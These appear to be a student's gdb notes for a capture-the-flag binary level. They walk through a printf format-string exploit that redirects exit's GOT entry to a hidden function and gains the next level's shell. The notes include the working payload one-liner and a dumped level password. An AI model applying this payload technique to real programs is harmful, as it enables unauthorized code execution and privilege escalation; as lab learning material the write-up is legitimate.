scp -P 4242 level5@192.168.56.103:/home/user/level5/level5 /home/zouz/Desktop/level5

// TODO preciser le context 

```
(gdb) r <<< $(python -c "print 'A' * 20 + '%x ' * 20")
Starting program: /home/user/level5/level5 <<< $(python -c "print 'A' * 20 + '%x ' * 20")
AAAAAAAAAAAAAAAAAAAA200 b7fd1ac0 b7ff37d0 41414141 41414141 41414141 41414141 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
[Inferior 1 (process 3468) exited with code 01]
```
offset 4

```
(gdb) r <<< $(python -c "print '\xff\x84\x04\x08' + '%4\$x'")
Starting program: /home/user/level5/level5 <<< $(python -c "print '\xff\x84\x04\x08' + '%4\$x'")
�80484ff
[Inferior 1 (process 3491) exited with code 01]
```
on arrive sur le exit

```
(gdb) x o
0x80484a4 <o>:	0x83e58955
(gdb) disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```

```
(gdb)  b *0x080484f3
Breakpoint 1 at 0x80484f3
(gdb) b *0x080484ff
Breakpoint 2 at 0x80484ff
(gdb) r
Starting program: /home/user/level5/level5 
sdsvsdvsdv

Breakpoint 1, 0x080484f3 in n ()
(gdb) x o
0x80484a4 <o>:	0x83e58955
(gdb) set {int}0x8049838=0x80484a4
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4
(gdb) c
Continuing.
sdsvsdvsdv

Breakpoint 2, 0x080484ff in n ()
(gdb) c
Continuing.
$ whoami
level5
```

we need to execute an exploit that will play with specifiers to reach the value of the address of o().

"%4$x" allows us to reference directly the 4th pf printf as we have seen that our injected string starts with tarameter ohe 4th value on the stack.

we still have the specifier %n that can be use to write the number of printed characters to an address on the stack.

0x80484a4 => 134513828

we'll use printf to pad a format string of that size.
but use 

0x8049838 is the address of exit + the number of bits we want to overwrite it with in int (d)

```
(gdb) r <<< $(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"')
...
Breakpoint 2, 0x080484ff in n ()
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4

we changed the address !
if we try outside gdb:

```
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' && cat) | ./level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
